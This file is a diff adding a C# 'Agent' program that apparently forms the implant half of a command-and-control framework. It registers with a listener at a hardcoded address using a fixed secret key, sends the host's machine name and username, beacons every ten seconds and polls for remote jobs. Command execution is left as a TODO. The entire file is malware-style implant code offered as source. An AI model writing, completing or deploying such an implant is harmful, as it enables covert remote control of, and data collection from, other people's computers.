@@ -1,0 +1,115 @@
+using System;
+using System.Net.Http;
+using System.Text;
+using System.Threading;
+using Newtonsoft.Json.Linq;
+
+namespace AgentCSharp
+{
+    class Agent
+    {
+        private const string LISTENER_IP = "127.0.0.1";
+        private const int LISTENER_PORT = 22885;
+        private const string SECRET_KEY = "PASSWORD";
+        private static string AGENT_ID;
+
+        static void Main(string[] args)
+        {
+            RegisterWithListener();
+
+            Thread heartbeatThread = new Thread(new ThreadStart(HeartbeatWithListener));
+            heartbeatThread.Start();
+
+            Thread commandThread = new Thread(new ThreadStart(CommandLoop));
+            commandThread.Start();
+        }
+
+        private static async void RegisterWithListener()
+        {
+            using (HttpClient client = new HttpClient())
+            {
+                client.DefaultRequestHeaders.Add("X-Secret-Key", SECRET_KEY);
+                var response = await client.PostAsJsonAsync($"http://{LISTENER_IP}:{LISTENER_PORT}/tag", GatherInfo());
+
+                if (response.IsSuccessStatusCode)
+                {
+                    var content = await response.Content.ReadAsStringAsync();
+                    var jsonObj = JObject.Parse(content);
+                    AGENT_ID = jsonObj["agent_id"].ToString();
+                    Console.WriteLine($"Successfully registered with ID: {AGENT_ID}");
+                }
+                else
+                {
+                    Console.WriteLine($"Registration failed: {response.StatusCode}");
+                }
+            }
+        }
+
+        private static JObject GatherInfo()
+        {
+            string hostname = Environment.MachineName;
+            string username = Environment.UserName;
+
+            return new JObject
+            {
+                { "hostname", hostname },
+                { "ip_address", "" },  // TODO: Implement IP address fetching.
+                { "username", username }
+            };
+        }
+
+        private static async void HeartbeatWithListener()
+        {
+            using (HttpClient client = new HttpClient())
+            {
+                client.DefaultRequestHeaders.Add("X-Secret-Key", SECRET_KEY);
+                while (true)
+                {
+                    try
+                    {
+                        var response = await client.GetAsync($"http://{LISTENER_IP}:{LISTENER_PORT}/beat");
+                        if (response.IsSuccessStatusCode)
+                        {
+                            Console.WriteLine("[+] Heartbeat acknowledged by server");
+                        }
+                        else
+                        {
+                            Console.WriteLine($"[-] Heartbeat failed: {response.StatusCode}");
+                        }
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"[-] Heartbeat error: {ex.Message}");
+                    }
+                    Thread.Sleep(10000); // 10 seconds sleep
+                }
+            }
+        }
+
+        private static async void CommandLoop()
+        {
+            using (HttpClient client = new HttpClient())
+            {
+                client.DefaultRequestHeaders.Add("X-Secret-Key", SECRET_KEY);
+                while (true)
+                {
+                    try
+                    {
+                        var response = await client.GetAsync($"http://{LISTENER_IP}:{LISTENER_PORT}/jobs/{AGENT_ID}");
+                        var content = await response.Content.ReadAsStringAsync();
+                        var jsonObj = JObject.Parse(content);
+
+                        // TODO: Implement command execution and response sending.
+
+                        Console.WriteLine($"Command received: {jsonObj}");
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"[-] Command loop error: {ex.Message}");
+                    }
+                    Thread.Sleep(5000);  // 5 seconds sleep
+                }
+            }
+        }
+    }
+}
